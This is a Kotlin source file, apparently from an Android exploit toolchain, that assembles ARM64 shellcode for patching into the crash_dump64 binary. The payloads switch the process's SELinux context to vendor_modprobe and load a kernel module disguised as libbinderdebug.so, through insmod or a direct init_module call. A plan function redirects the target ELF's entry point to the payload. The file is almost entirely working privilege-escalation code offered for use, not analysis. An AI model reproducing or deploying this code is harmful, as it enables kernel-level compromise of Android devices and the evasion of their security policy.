package com.ghostlock.app.engine.pagecache

import com.ghostlock.app.engine.pagecache.stage.StageLog
import com.ghostlock.app.engine.pagecache.stage.silentStageLog

/**
 * crash_dump64 静态入口 payload：
 *   1. 写 /proc/self/attr/exec = u:r:vendor_modprobe:s0
 *   2. execve("/vendor/bin/insmod", [insmod, /vendor/lib64/libbinderdebug.so], NULL)
 *
 * 位置无关；入口直接执行，不需要 sentry 上下文。
 */
object EntryPayload {
    const val SITE_FILE: Long = 0x428L
    const val SITE_VADDR: Long = 0x204428L
    const val LANDING_FILE: Long = 0x430L
    const val LANDING_VADDR: Long = 0x204430L
    const val BRANCH_WORD: Int = 0x14000002

    private const val ATTR_EXEC = "/proc/self/attr/exec"
    private const val SELINUX_CTX = "u:r:vendor_modprobe:s0"
    private const val INSMOD = "/vendor/bin/insmod"
    private const val KO = "/vendor/lib64/libbinderdebug.so"

    /** 诊断：crash_dump 域直接 init_module(carrier)，不 exec insmod。 */
    fun initModuleBytes(log: StageLog = silentStageLog): ByteArray {
        log.verbose("EntryPayload.initModuleBytes")
        val words = ArrayList<Int>(40)
        fun emit(word: Int) { words.add(word) }
        fun adr(rd: Int, fromOffset: Int, toOffset: Int): Int {
            val imm = toOffset - fromOffset
            return 0x10000000 or ((imm and 0x3) shl 29) or (((imm shr 2) and 0x7FFFF) shl 5) or rd
        }
        val codeBytes = 34 * 4
        val carrierOff = codeBytes
        val emptyOff = carrierOff + KO.length + 1
        emit(0xD2880003.toInt())              /* mov x3, #0x4000 */
        emit(0xCB0303FF.toInt())              /* sub sp, sp, x3 */
        emit(adr(1, 8, carrierOff))           /* adr x1, carrier */
        emit(0x92800C60.toInt())              /* mov x0, #-100 */
        emit(0xAA1F03E2.toInt())              /* mov x2, xzr (O_RDONLY) */
        emit(0xAA1F03E3.toInt())              /* mov x3, xzr */
        emit(0xD2800708.toInt())              /* mov x8, #56 openat */
        emit(0xD4000001.toInt())              /* svc */
        emit(0xAA0003F3.toInt())              /* mov x19, x0 */
        emit(0xAA1303E0.toInt())              /* mov x0, x19 */
        emit(0x910003E1.toInt())              /* mov x1, sp */
        emit(0xD2880002.toInt())              /* mov x2, #0x4000 */
        emit(0xD28007E8.toInt())              /* mov x8, #63 read */
        emit(0xD4000001.toInt())              /* svc */
        emit(0x910003E0.toInt())              /* mov x0, sp */
        emit(0xD2860201.toInt())              /* mov x1, #12304 */
        emit(adr(2, 64, emptyOff))            /* adr x2, empty */
        emit(0xD2800D28.toInt())              /* mov x8, #105 init_module */
        emit(0xD4000001.toInt())              /* svc */
        emit(0xCB0003E0.toInt())              /* neg x0, x0 */
        emit(0xD2800BA8.toInt())              /* mov x8, #93 exit */
        emit(0xD4000001.toInt())              /* svc */
        /* pad to codeBytes with NOPs so offsets stay fixed */
        while (words.size * 4 < codeBytes) {
            emit(0xD503201F.toInt())          /* nop */
        }
        val raw = ByteArray(codeBytes + KO.length + 1 + 1)
        var at = 0
        for (word in words) {
            raw[at++] = (word and 0xFF).toByte()
            raw[at++] = ((word ushr 8) and 0xFF).toByte()
            raw[at++] = ((word ushr 16) and 0xFF).toByte()
            raw[at++] = ((word ushr 24) and 0xFF).toByte()
        }
        KO.toByteArray().copyInto(raw, at); at += KO.length
        raw[at++] = 0
        raw[at] = 0
        log.debug("EntryPayload.initModuleBytes", "ok", "bytes" to raw.size)
        return raw
    }

    /** 诊断用：只 exit(42)。 */
    fun exitOnly(log: StageLog = silentStageLog): ByteArray {
        log.verbose("EntryPayload.exitOnly")
        val raw = byteArrayOf(
        0x40, 0x05, 0x80.toByte(), 0xD2.toByte(),
        0xA8.toByte(), 0x0B, 0x80.toByte(), 0xD2.toByte(),
        0x01, 0x00, 0x00, 0xD4.toByte(),
        0x00, 0x00, 0x00, 0x00,
        )
        log.debug("EntryPayload.exitOnly", "ok", "bytes" to raw.size)
        return raw
    }

    fun bytes(log: StageLog = silentStageLog): ByteArray {
        log.verbose("EntryPayload.bytes")
        val words = ArrayList<Int>(32)
        fun emit(word: Int) { words.add(word) }
        fun adr(rd: Int, fromOffset: Int, toOffset: Int): Int {
            val imm = toOffset - fromOffset
            val immlo = imm and 0x3
            val immhi = (imm shr 2) and 0x7FFFF
            return 0x10000000 or (immlo shl 29) or (immhi shl 5) or rd
        }
        val codeBytes = 25 * 4
        val attrOff = codeBytes
        val ctxOff = attrOff + ATTR_EXEC.length + 1
        val exeOff = ctxOff + SELINUX_CTX.length + 1
        val koOff = exeOff + INSMOD.length + 1

        emit(0xD10083FF.toInt())              /* sub sp, sp, #32 */
        emit(adr(1, 4, attrOff))              /* adr x1, attr_exec */
        emit(0x92800C60.toInt())              /* mov x0, #-100 (AT_FDCWD) */
        emit(0xD2800022.toInt())              /* movz x2, #1 (O_WRONLY) */
        emit(0xF2800122.toInt())              /* movk x2, #8, lsl #16 (O_CLOEXEC) */
        emit(0xAA1F03E3.toInt())              /* mov x3, xzr */
        emit(0xD2800708.toInt())              /* mov x8, #56 (openat) */
        emit(0xD4000001.toInt())              /* svc #0 */
        emit(adr(1, 36, ctxOff))              /* adr x1, selinux_ctx */
        emit(0xD28002C2.toInt())              /* mov x2, #22 (ctx len) */
        emit(0xD2800808.toInt())              /* mov x8, #64 (write) */
        emit(0xD4000001.toInt())              /* svc #0 */
        emit(adr(1, 48, exeOff))              /* adr x1, exe_path */
        emit(0xF90003E1.toInt())              /* str x1, [sp] */
        emit(adr(1, 56, koOff))               /* adr x1, ko_target */
        emit(0xF90007E1.toInt())              /* str x1, [sp, #8] */
        emit(0xF9000BFF.toInt())              /* str xzr, [sp, #16] */
        emit(adr(0, 68, exeOff))              /* adr x0, exe_path */
        emit(0x910003E1.toInt())              /* mov x1, sp */
        emit(0xAA1F03E2.toInt())              /* mov x2, xzr */
        emit(0xD2801BA8.toInt())              /* mov x8, #221 (execve) */
        emit(0xD4000001.toInt())              /* svc #0 */
        emit(0xCB0003E0.toInt())              /* neg x0, x0 */
        emit(0xD2800BA8.toInt())              /* mov x8, #93 (exit) */
        emit(0xD4000001.toInt())              /* svc #0 */

        val raw = ByteArray(words.size * 4 + ATTR_EXEC.length + 1 +
            SELINUX_CTX.length + 1 + INSMOD.length + 1 + KO.length + 1)
        var at = 0
        for (word in words) {
            raw[at++] = (word and 0xFF).toByte()
            raw[at++] = ((word ushr 8) and 0xFF).toByte()
            raw[at++] = ((word ushr 16) and 0xFF).toByte()
            raw[at++] = ((word ushr 24) and 0xFF).toByte()
        }
        ATTR_EXEC.toByteArray().copyInto(raw, at); at += ATTR_EXEC.length
        raw[at++] = 0
        SELINUX_CTX.toByteArray().copyInto(raw, at); at += SELINUX_CTX.length
        raw[at++] = 0
        INSMOD.toByteArray().copyInto(raw, at); at += INSMOD.length
        raw[at++] = 0
        KO.toByteArray().copyInto(raw, at); at += KO.length
        raw[at] = 0
        log.debug("EntryPayload.bytes", "ok", "bytes" to raw.size)
        return raw
    }

    /** 从目标 ELF 派生入口 plan；branch 目标就是 landing 本身（不是 sentry 的 +0x90）。 */
    fun plan(target: ElfTarget, log: StageLog = silentStageLog): KotlinSentryPlan? {
        log.verbose("EntryPayload.plan", "target" to target.path)
        val derived = KotlinElfPlanner.planEntry(target, bytes(log), log) ?: return null
        val branch = KotlinElfPlanner.encodeBranch(derived.siteVaddr, derived.landingVaddr, log) ?: return null
        log.debug("EntryPayload.plan", "ok", "site" to derived.siteVaddr)
        return derived.copy(
            branchWord = branch,
            jumpBackWord = 0,
            entryOffset = 0,
            displacedOffset = 0,
            jumpBackOffset = 0,
        )
    }
}
